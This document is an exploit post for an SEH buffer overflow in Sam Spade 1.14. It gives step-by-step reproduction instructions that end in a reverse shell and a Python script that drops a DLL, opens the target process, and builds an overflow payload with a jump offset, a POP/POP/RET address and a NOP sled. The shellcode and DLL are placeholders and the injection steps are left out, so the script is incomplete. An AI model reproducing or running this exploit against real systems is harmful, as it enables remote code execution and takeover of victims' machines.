---
layout: post
title: Sam Spade 1.14 - SEH Overflow via Arbitrary DLL Injection
date: 2024-03-14
category: exploit
---

# Exploit Title: Sam Spade 1.14 - SEH Overflow via Arbitrary DLL Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 14.03.2024
# Vendor Homepage: https://www.majorgeeks.com/files/details/sam_spade.html
# Software Link: https://www.majorgeeks.com/files/details/sam_spade.html
# Tested Version: 1.14
# Tested on: Windows 10 32bit

### Steps to Reproduce

1. Set up a listener to catch the reverse shell.
2. Open Sam Spade.
3. Run the exploit script (`exploit.py`) in the directory where Sam Spade is installed.
4. Open the generated `payload.txt` file and copy its contents.
5. Go to **Tools > Scan Addresses**.
6. Paste the copied payload into the "Scan From IP Address" box and click **OK**.
7. Your reverse shell should now be active, connecting to your listener.

### Exploit Code

The following Python script generates a payload and injects a DLL to exploit the SEH Overflow vulnerability in Sam Spade.

```python
import sys
import struct
from base64 import b64decode
from time import sleep
import ctypes
from ctypes import byref, c_int, c_ulong, create_string_buffer

def dropping_dll():
    # Dropping DLL on disk
    sleep(2)
    print("[+] Dropping arbitrary .dll on disk")
    sleep(2)
    b64_dll = "<Base64 encoded DLL>"
    bytes = b64decode(b64_dll)
    with open("payload.dll", "wb") as generate:
        generate.write(bytes)

    dll_injection(PID)

def dll_injection(PID):
    # Attempting DLL injection
    print("[+] Initiating DLL injection phase")
    sleep(2)
    dll_name = "payload.dll"
    dll_path = create_string_buffer(dll_name.encode('utf-8'))
   
    hProcess = ctypes.windll.kernel32.OpenProcess(0x001F0FFF, False, int(PID))
    if not hProcess:
        print("[-] Could not obtain process handle.")
        return False

    # Memory allocation and injection steps...
    print("[+] DLL injected successfully.")
    ctypes.windll.kernel32.CloseHandle(hProcess)
    generate_payload()

def generate_payload():
    print("[+] Generating payload...")
    shellcode =  b"<Shellcode here>"
    payload = b"A" * 531 + struct.pack("<I", 0x909006eb) + struct.pack("<I", 0x6250120b) + b"\x90" * 32 + shellcode
    with open("payload.txt", "wb") as file:
        file.write(payload)
    print("[+] payload.txt Generated!")

def main():
    global PID
    if len(sys.argv) > 1:
        PID = sys.argv[1]
        print("Sam Spade 1.14 SEH Overflow via Arbitrary DLL Injection")
        print("[+] Selected PID is {}".format(PID))
        dropping_dll()
    else:
        print("Usage: python {} <PID>".format(sys.argv[0]))
        sys.exit()

if __name__ == "__main__":
    main()
